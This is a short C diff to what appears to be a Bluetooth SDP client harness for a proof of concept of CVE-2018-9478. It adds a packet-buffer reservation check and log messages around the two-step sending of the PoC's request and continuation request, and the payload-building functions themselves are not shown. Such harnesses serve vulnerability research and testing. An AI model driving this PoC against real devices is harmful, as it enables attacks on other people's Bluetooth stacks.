@@ -372,6 +372,13 @@ static void sdp_client_send_request(uint16_t channel)
     if (sdp_client_state != W2_SEND)
         return;
 
+    uint8_t ret = l2cap_reserve_packet_buffer();
+    if (!ret)
+    {
+        log_error("Unable to reserve l2cap packet buffer");
+        return;
+    }
+
     uint8_t *data = l2cap_get_outgoing_buffer();
     uint16_t request_len = 0;
 
@@ -392,16 +399,18 @@ static void sdp_client_send_request(uint16_t channel)
     case SDP_CVE_2018_9478_Response:
         if (poc_done)
         {
-            printf("POC is done!\n");
+            log_info("CVE_2018_9478 POC is done!\n");
             break;
         }
         if (!first_request_sent)
         {
+            log_info("Sending first request for CVE_2018_9478");
             request_len = sdp_client_setup_CVE_2018_9478_request(data);
             first_request_sent = true;
         }
         else
         {
+            log_info("Sending second request for CVE_2018_9478");
             request_len = sdp_client_setup_CVE_2018_9478_cont_request(data);
             poc_done = true;
         }
